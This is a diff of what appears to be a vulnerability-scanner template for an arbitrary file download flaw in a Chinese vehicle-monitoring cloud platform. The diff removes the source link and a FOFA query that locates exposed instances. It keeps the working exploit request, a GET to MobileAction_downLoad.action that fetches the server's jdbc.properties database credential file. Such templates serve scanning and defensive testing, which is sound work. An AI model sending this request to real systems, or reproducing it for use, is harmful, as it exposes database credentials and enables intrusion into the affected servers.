@@ -3,12 +3,8 @@ info:
   name: 鸿运主动安全监控云平台任意文件下载
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kxyfo8vqn50zws2o'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kxyfo8vqn50zws2o
-    fofa: body="./open/webApi.html"
 http:
 - raw:
   - 'GET /808gps/MobileAction_downLoad.action?path=/WEB-INF/classes/config/jdbc.properties HTTP/1.1
